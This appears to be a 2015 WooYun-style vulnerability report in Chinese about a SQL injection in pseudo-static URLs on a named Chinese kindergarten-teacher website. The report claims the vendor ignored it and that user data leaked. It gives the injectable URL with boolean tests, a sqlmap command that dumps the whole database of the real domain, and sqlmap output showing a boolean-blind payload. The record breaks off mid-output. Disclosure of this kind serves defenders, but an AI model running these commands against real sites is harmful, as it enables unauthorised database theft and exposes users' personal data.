wybug_title: 师乐汇-中国幼儿教师网某处伪静态注入
wybug_corp: 北京东方之星幼儿教育科技有限公司
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail: 漏洞详情 披露状态：   									2015-10-08：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-11-22：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 师乐汇-中国幼儿教师网某处伪静态注入，导致数据库被脱，大量用户数据泄露 详细说明：  注入点www.yejs.com.cn/yjll/article/id/52071.htmwww.yejs.com.cn/yjll/article/id/52071 and 1=1.htm 返回正常www.yejs.com.cn/yjll/article/id/52071 and 1=2.htm  返回错误   漏洞证明：  直接上sqlmap吧~# sqlmap -u www.yejs.com.cn/yjll/article/id/52071*.htm -D yejs --dump-all    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 14:58:40custom injection marking character ('*') found in option '-u'. Do you want to process it? [Y/n/q] [14:58:42] [INFO] resuming back-end DBMS 'mysql' [14:58:42] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://www.yejs.com.cn:80/yjll/article/id/52071) AND 6678=6678 AND (1637=1637.htm---[14:58:44] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5[14:58:44] [INFO] fetching tables for database: 'yejs'[14:58:44] [INFO] fetching
